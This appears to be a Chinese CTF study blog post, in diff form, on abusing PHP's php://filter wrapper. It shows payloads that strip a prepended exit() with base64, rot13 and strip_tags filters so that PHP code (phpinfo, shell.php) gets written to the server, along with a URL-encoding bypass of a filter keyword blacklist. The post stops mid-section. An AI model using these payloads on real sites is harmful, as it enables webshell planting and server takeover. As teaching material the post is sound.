+    <div class="post-body" itemprop="articleBody"><h1 id="对php的filter过滤器利用的总结"><a href="#对php的filter过滤器利用的总结" class="headerlink" title="对php的filter过滤器利用的总结"></a>对php的filter过滤器利用的总结</h1><p>最近打比赛都遇到了这种考点，这里在学习后总结一下。</p>
+<span id="more"></span>
+
+<h3 id="对php-filter的说明"><a href="#对php-filter的说明" class="headerlink" title="对php://filter的说明"></a>对<code>php://filter</code>的说明</h3><h5 id="基本说明"><a href="#基本说明" class="headerlink" title="基本说明"></a>基本说明</h5><p><code>php://filter</code>是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。</p>
+<p>基本格式为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=?/resource=?</span></span><br></pre></td></tr></table></figure>
+
+<p>说明：</p>
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>resource</td>
+<td>在<code>php://filter</code>中，<code>resource</code>参数是必须的。<code>resource</code>用于指定<code>需要进行筛选过滤的数据流</code></td>
+</tr>
+<tr>
+<td>read</td>
+<td><code>read</code>参数指定<code>一个或多个过滤器</code>用于<code>读</code>操作，多个过滤器之间以管道符&#96;</td>
+</tr>
+<tr>
+<td>write</td>
+<td><code>write</code>参数指定<code>一个或多个过滤器</code>用于<code>写</code>操作，多个过滤器之间以管道符&#96;</td>
+</tr>
+<tr>
+<td>无read或write为前缀</td>
+<td>任何没有以read&#x3D;或write&#x3D;作前缀的筛选器列表会视情况应用于读或写链</td>
+</tr>
+</tbody></table>
+<p>注意：任何没有与<code>read=</code>或<code>write=</code>作前缀的筛选器列表会<code>视情况应用于读或写操作</code>。这意味着在指定筛选器的过程中，<code>read</code>与<code>write</code>参数可被忽略。</p>
+<h5 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h5><p>以<code>file_get_contents()</code>函数为例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/resource=haha.txt&#x27;</span>);</span><br><span class="line"><span class="comment">#flag&#123;123ahdiuahd&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=haha.txt&#x27;</span>);</span><br><span class="line"><span class="comment">#ZmxhZ3sxMjNhaGRpdWFoZH0=</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/read=string.rot13/resource=haha.txt&#x27;</span>);</span><br><span class="line"><span class="comment">#synt&#123;123nuqvhnuq&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>以<code>file_put_contents()</code>函数为例:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/resource=11.txt&#x27;</span>,<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line"><span class="comment">#11.txt文件内容：hello world</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/write=convert.base64-encode/resource=12.txt&#x27;</span>,<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line"><span class="comment">#12.txt文件内容：aGVsbG8gd29ybGQ=</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/write=string.rot13/resource=13.txt&#x27;</span>,<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line"><span class="comment">#13.txt文件内容：uryyb jbeyq</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="重要过滤器"><a href="#重要过滤器" class="headerlink" title="重要过滤器"></a><strong>重要过滤器</strong></h5><h6 id="string-strip-tags："><a href="#string-strip-tags：" class="headerlink" title="string.strip_tags："></a>string.strip_tags：</h6><p>简单说明：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522172738818.png" class title="image-20240522172738818">
+
+<p>注意：这里虽然说是php7.3.0后废除，但是看了看网上在线的php官方文档&#x3D;&#x3D;直到php8.0还没有完全废弃</p>
+<p>使用此过滤器等同于用<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.strip-tags.php">strip_tags()函数</a>处理所有的流数据，官网文档函数说明：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521145500302.png" class title="image-20240521145500302">
+
+<p>这里的标签包含诸如<code>&lt;html&gt;</code>、**<code>&lt;haha</code>**或者<code>&lt;?</code>等标志都会被去除掉，测试一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">这里用函数<span class="title function_ invoke__">strip_tags</span>()来演示：</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="number">1</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;ha&gt;haha&lt;/aher&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：haha</span></span><br><span class="line"><span class="number">2</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;htmlhahaha-flag=&#123;adgaiudgiuag&#125;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：全部被删除了，这是因为虽然不是一个标准的HTML标签，但任然符合标签格式，所以都被当做了html标签被删除</span></span><br><span class="line"><span class="number">3</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;htmlhahaha-flag=&#123;adgaiudgiuag&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：全部被删除了</span></span><br><span class="line"><span class="number">4</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt; htmlhahaha-flag=&#123;adgaiudgiuag&#125;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：&lt; htmlhahaha-flag=&#123;adgaiudgiuag&#125;</span></span><br><span class="line"><span class="number">5</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;htmlhahaha-flag=&#123;adgaiudgiuag&#125; &gt;&#x27;</span></span><br><span class="line"><span class="comment">#结果：全删</span></span><br><span class="line"><span class="number">6</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;?php htmlhahaha-flag=&#123;adgaiudgiuag&#125;?&gt;&#x27;</span></span><br><span class="line"><span class="comment">#结果：全部被删除，php元素应该是会全部被删除</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>说明一下区别：</strong></p>
+<ul>
+<li><p>2和3区别： 为什么<code>&lt;haha</code>也会全部被删除，这是因为当调用<code>strip_tags()</code>时，它会执行以下操作，</p>
+<p>（1）它会从左到右扫描字符串，找到第一个<code>&lt;</code>，</p>
+<p>（2）继续扫描直到找到<code>&gt;</code>，<strong>在此过程中，所有字符都被认为是标签的一部分</strong>。</p>
+<p>（3）移除标签：将<code>&lt;</code>和<code>&gt;</code>之间的所有内容删除。</p>
+</li>
+<li><p>2与3区别：</p>
+</li>
+<li></li>
+</ul>
+<p>清晰明了。</p>
+<ul>
+<li><p>4和5区别：空格位置不同导致结果也不同，这就有html中的标签和属性有关了，首先，标签名称不能包含空格，但是标签属性部分可以包含空格，如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://example.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>Visit Example<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>则在这里:</p>
+<p>（1）<code>&lt;a&gt;</code>是标签名称，表示一个超链接元素，</p>
+<p>（2）<code>href=&quot;https://example.com&quot;</code> 是一个属性，指定链接的目标 URL。</p>
+<p>（3）<code>target=&quot;_blank&quot;</code> 是另一个属性，指定链接打开的方</p>
+</li>
+</ul>
+<p>所以标签名称前面是不能有空格的，后面有没有无所谓，就算有空格都只是被当做标签名称与属性分隔的地方。</p>
+<p><strong>这里一定要注意：</strong></p>
+<ul>
+<li><p><code>&lt;</code>对应<code>&gt;</code>代表结束，<code>&lt;?</code>一定要有<code>?&gt;</code>才代表结束</p>
+</li>
+<li><p>php元素（<code>&lt;?</code>）没有前面必须没有空格的说法，只要是这在这两个相对应的符号之间的内容全部都会被去除</p>
+</li>
+</ul>
+<h6 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*:"></a>convert.iconv.*:</h6><p>这个过滤器需要<code>php</code>支持<code>iconv</code>。而<code>iconv</code>是默认编译的。使用<code>convert.iconv.*</code>过滤器等同于用<code>iconv()</code>函数处理所有的流数据。</p>
+<p><code>iconv</code>——将字符串按要求的字符编码来转换</p>
+<p><code>convert.iconv.*</code>有两种使用方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可用的字符编码：（其他可参考<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/mbstring.supported-encodings.php">官方手册</a>）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8*</span><br><span class="line">ASCII*</span><br></pre></td></tr></table></figure>
+
+<p>等如压缩过滤器的其他过滤器的利用可以自己去看</p>
+<h6 id="小绕过"><a href="#小绕过" class="headerlink" title="小绕过"></a>小绕过</h6><p>比如有的时候会对过滤器进行过滤，如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="variable">$content</span>))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>); </span><br></pre></td></tr></table></figure>
+
+<p><strong>此时有个小知识点</strong>：伪协议处理时会对过滤器<code>urldecode</code>过滤一次。</p>
+<p>所以可以利用二次编码绕过，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=string.%7%32ot13|&lt;?cuc cucvasb();?&gt;|/resource=w0s1np.php</span><br></pre></td></tr></table></figure>
+
+<p>可以直接在burp上使用<code>URL-encode all characters</code>对其进行URL全编码,主要是要将字符也编码。</p>
+<p>并且在自己的搭建的环境也成功测试。</p>
+<h3 id="利用编码解码来’模糊’代码"><a href="#利用编码解码来’模糊’代码" class="headerlink" title="利用编码解码来’模糊’代码"></a>利用编码解码来’模糊’代码</h3><p>这里以文件包含的<code>死亡exit()</code>绕过为例子，比如有下面的代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。</p>
+<p>但是注意，<code>file_put_content()</code>函数是可以使用php:&#x2F;&#x2F;filter，同时这里的<code>$_POST[&#39;filename&#39;]</code>是可以被控制为传入的参数为伪协议的，那么我们就可以在这里尝试做文章。</p>
+<p>思路：只要将<code>content</code>前面部分的那段代码使用某种手段（编码等）进行处理，导致<code>php</code>不能识别该部分就行，这里的<code>$_POST[&#39;filename&#39;]</code>是可以控制协议的。</p>
+<h4 id="利用base64编码"><a href="#利用base64编码" class="headerlink" title="利用base64编码"></a>利用base64编码</h4><p>使用<code>php://filter</code>流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p>
+<p><strong>核心原理</strong>：Base64编码中只包含64个可打印字符，而PHP在解码Base64时，遇到不在其中的字符时，将会跳过这些字符，键将合法字符组成一个进的字符串进行解码。</p>
+<p>所以，一个正常的<code>base64_decode</code>实际上可以理解为如下两个步骤。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>所以，当<code>$content</code>被加上了<code>&lt;?php  exit; ?&gt;</code>以后，当使用<code>php://filter/write=convert.base64-decode</code>对其解码，<strong>在解码的过程中，字符<code>&lt;</code>、<code>?</code>、<code>;</code>、<code>&gt;</code>、<code>空格</code>等字符会因为不符合base64编码的字符范围被忽略，所以最终被解码的字符仅有<code>phpexit</code>和我们传入的其他字符。</strong></p>
+<p><code>phpexit</code>一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加一个”a”一共8个字符。这样，<code>phpexita</code>被正常解码，而后面我们传入的webshell的base64内容页被正常解码，结果就是<code>&lt;?php exit;?&gt;</code>没有了。</p>
+<p><strong>最后效果</strong></p>
+<p>成功写入：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521191114493.png" class title="image-20240521191114493">
+
+<p>成功执行：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521191420996.png" class title="image-20240521191420996">
+
+<h4 id="利用rot13编码"><a href="#利用rot13编码" class="headerlink" title="利用rot13编码"></a>利用rot13编码</h4><p><strong>条件</strong>：<code>short_open_tag = off</code>,即不开启短标签（也许默认为On，自己的配置就是）</p>
+<p>原理和上面类似，核心是将“死亡exit”去除，<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在不开启<code>short_open_tag</code>时，php不认识这个字符串，当然也就不会执行。</p>
+<p><strong>最后效果</strong></p>
+<p>成功写入：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521194945000.png" class title="image-20240521194945000">
+
+<p>成功执行：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521195044746.png" class title="image-20240521195044746">
+
+
+
+<p><strong>同时经测试，将条件改为On，不能执行。</strong></p>
+<h4 id="利用字符串操作方法"><a href="#利用字符串操作方法" class="headerlink" title="利用字符串操作方法"></a>利用字符串操作方法</h4><p>这里就需要用到上面阐述过的<code>string.strip_tags</code>，在测试代码中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>&lt;?php exit; ?&gt;</code>实际上是一个XML标签，既然是XML标签，就可以利用<code>strip_tags</code>函数去除它，而<code>php://filter</code>是支持这个方法的，</p>
+<p>已经阐述过<code>string.strip_tags</code>过滤器会过滤的东西，那么我们可以直接尝试这样构造</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=string.strip_tags|convert.base64-decode/resource=12.txt&amp;txt=PD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#为了防止想传入的数据也被去除掉，所以这里也将内容编码一下</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>最后效果</strong></p>
+<p>成功写入：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521201629726.png" class title="image-20240521201629726">
+
+<p>成功执行：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521201701528.png" class title="image-20240521201701528">
+
+
+
+<p><strong>这个方法的做题记录：</strong><br>写入：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521202558001.png" class title="image-20240521202558001">
+
+<p>利用：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521202621401.png" class title="image-20240521202621401">
+
+
+
+<h4 id="代码变形bypass"><a href="#代码变形bypass" class="headerlink" title="代码变形bypass"></a>代码变形bypass</h4><p>对于这个板块的代码可利用的有三种，总结一下(注意融汇贯通，比如下面的<code>convert.iconv*</code>也许也能用于起亚抢矿，注重思考)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">第一种情况，就是上面说的那种：</span><br><span class="line">file_put_contents($_POST[&#x27;filename&#x27;],&quot;&lt;?php exit();&quot;.$_POST[&#x27;content&#x27;]); </span><br><span class="line"></span><br><span class="line">第二种：相同变量</span><br><span class="line">$content = $GET[&#x27;content&#x27;];</span><br><span class="line">file_put_contents($content,&#x27;&lt;?php exit;&#x27;.$content);</span><br><span class="line"></span><br><span class="line">第三种</span><br></pre></td></tr></table></figure>
+
+<p>第一种情况已经在上面已经有比较清楚的说明，先在来说说第二种情况。</p>
+<h5 id="bypass相同变量"><a href="#bypass相同变量" class="headerlink" title="bypass相同变量"></a>bypass相同变量</h5><p>这里对应第二种情况，bypass的方法如下</p>
+<h6 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h6><p><strong>首先有个知识点：</strong><code>=</code>在base64中的作用是填充，也就是意味着结束；在<code>=</code>的后面是不允许有其他任何字符的，否则会报错，并且这样会导致无法正常写入文件的。测试一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/convert.base64-decode/resource=2.txt&#x27;</span>,<span class="string">&#x27;PD9waHAgcGhwaW5mbygpOz8+=.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>运行过后没有写入文件，2.txt文件为空。再改一下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/convert.base64-decode/resource=2.txt&#x27;</span>,<span class="string">&#x27;PD9waHAgcGhwaW5mbygpOz8+.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>成功向2.txt文件写入东西</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522131121762.png" class title="image-20240522131121762">
+
+<p>确实存在这个问题，<strong>需要注意</strong></p>
+<p>——————</p>
+<p>常规可想到的payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</span></span><br></pre></td></tr></table></figure>
+
+<p><code>content</code>拼接过后的内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>();php:<span class="comment">//filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</span></span><br></pre></td></tr></table></figure>
+
+<p>此时就有一个问题<strong>，<code>=</code>的问题</strong>，需要使用一个方法将其去掉这里考虑<code>string.strip_tags</code>过滤器，如下构造：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2b</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#注意，这里需要将&#x27;+&#x27;URL编码为%2B,防止被浏览器当做空格处理</span></span><br></pre></td></tr></table></figure>
+
+<p>此时拼接后的语句可以**配合到php前后对应的标签被去除只剩下<code>PD9waHAgcGhwaW5mbygpOz8+.php</code>**，再被base64解码形成想要执行的字符串并填入到文件中，如下测试代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php&#x27;</span>,<span class="string">&#x27;&lt;?php exit;php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>成功执行（生成了一个文件，文件名为<code>?&gt;PD9waHAgcGhwaW5mbygpOz8%2b.php</code>，但是没有内容），估计是系统问题</p>
+<p>但是由于文件名不正常，想读就必须加上引号，但是在浏览器访问的时候访问不到看（引号问题），不好读，这里可以尝试将其改变为一个正常的文件名，这里采用<strong>伪目录的方法</strong>（这里将<code>resource</code>后面前面的base64字符和闭合的符号整体看做一个目录，但是由于没有这个目录，于是就撤回到了原目录，可以生成我们能够访问的文件名），于是构建如下payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../haha.php</span></span><br></pre></td></tr></table></figure>
+
+<p>这样可以构建出haha.php，文件，内容为<code>&lt;?php phpinfo();?&gt;</code>，原理我是get到了，但是本地搭没测试出来，怪，等有题的时候再试试。</p>
+<h6 id="rot13绕过"><a href="#rot13绕过" class="headerlink" title="rot13绕过"></a>rot13绕过</h6><p>首先rot13编码不受限于<code>=</code>,并且条件同样为之前那个（<code>short_open_tag = off</code>），这样才不会被PHP识别为代码。</p>
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">content=php:<span class="comment">//filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=shell.php</span></span><br><span class="line"></span><br><span class="line">content=php:<span class="comment">//filter/write=string.rot13/resource=&lt;?cuc cucvasb();?&gt;/../shell.php</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>对于第一个payload个人理解（重要，后面对于这种构造方法利用的比较多）</strong>：第一个payload将我们想要利用的字符串放进了了过滤器列表里面，个人猜测是php程序在运行这串代码时会找有没有这个过滤器，没有就直接跳过舍弃。</p>
+<p>测试一下：</p>
